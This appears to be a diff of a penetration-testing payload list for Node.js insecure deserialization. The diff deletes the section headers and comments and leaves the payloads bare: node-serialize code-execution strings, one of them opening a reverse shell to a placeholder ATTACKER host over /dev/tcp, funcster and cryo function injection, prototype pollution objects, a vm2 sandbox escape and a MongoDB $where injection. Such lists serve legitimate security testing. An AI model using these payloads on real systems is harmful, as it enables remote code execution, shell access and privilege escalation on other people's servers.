@@ -1,45 +1,18 @@
-# ============================================================
-# Insecure Deserialization — Node.js
-# ============================================================
-
-# ---- node-serialize RCE (CVE-2017-5941) ----
-# IIFE (Immediately Invoked Function Expression) via __proto__
 {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(err,stdout){console.log(stdout)})}()"}
 
-# ---- node-serialize reverse shell ----
 {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -i >& /dev/tcp/ATTACKER/4444 0>&1')}()"}
 
-# ---- funcster deserialization ----
 {"__js_function": "function(){require('child_process').exec('id')}()"}
 
-# ---- cryo deserialization ----
 {"root":{"__cryo_type__":"__cryo_function__","__cryo_value__":"function(){require('child_process').execSync('id')}"}}
 
-# ---- express-jwt / jsonwebtoken weak secret ----
-# If secret is known or weak:
-# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.<sig>
-
-# ---- Prototype Pollution via JSON.parse ----
 {"__proto__":{"isAdmin":true}}
 {"constructor":{"prototype":{"isAdmin":true}}}
 
-# ---- Serialize Buffer Deserialization ----
-# node-serialize serializes Buffer objects:
 {"data":{"type":"Buffer","data":[105,100]}}
 
-# ---- vm2 Sandbox Escape ----
 const {VM} = require('vm2');
 const vm = new VM();
 vm.run('this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString()');
 
-# ---- eval() sinks in deserialization ----
-# Look for: eval(payload), Function(payload)(), vm.runInNewContext(payload)
-# In cookies, headers, JSON body parameters
-
-# ---- BSON Injection (MongoDB) ----
 {"$where": "function() { return this.username == 'admin'; }"}
-
-# ---- Detection: Serialized Node Objects ----
-# node-serialize: {"key":"_$$ND_FUNC$$_..."}
-# cryo: {"root":{"__cryo_type__":...}}
-# funcster: {"__js_function":...}
